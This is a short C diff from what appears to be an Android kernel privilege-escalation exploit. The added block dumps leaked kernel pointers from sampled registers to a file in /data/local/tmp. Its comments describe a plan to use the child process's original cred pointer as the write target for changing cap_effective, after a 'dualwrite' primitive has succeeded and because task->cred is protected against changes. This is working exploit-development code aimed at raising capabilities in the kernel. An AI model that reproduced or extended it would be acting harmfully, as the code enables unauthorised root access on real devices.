@@ -1843,6 +1843,24 @@ static void child_main(struct child_pipes *p) {
       pr_info("child self-leak FAILED (cnt=%d) — token stays 0\n",
               ml.x28_cnt);
     }
+    /* 09-13 caps-mutation plan: dump every unique kernel-range sampled
+     * value — the child's ORIGINAL cred pointer rides in syscall-path
+     * registers; it is the store target for cap_effective mutation
+     * (task->cred pointer itself is revert-protected, proven by
+     * child_wake setuid=-1 EPERM after a landed dualwrite). */
+    {
+      int rf = open("/data/local/tmp/child_regs.txt",
+                    O_WRONLY | O_CREAT | O_TRUNC, 0666);
+      if (rf >= 0) {
+        for (int u = 0; u < ml.nuniq; u++) {
+          char rb[96];
+          int rn = snprintf(rb, sizeof(rb), "%016zx %d\n",
+                            ml.uniq[u], ml.uniq_cnt[u]);
+          if (rn > 0) (void)write(rf, rb, (size_t)rn);
+        }
+        close(rf);
+      }
+    }
   }
   write(p->task_w, &my_task, sizeof(my_task));
   close(p->task_w);
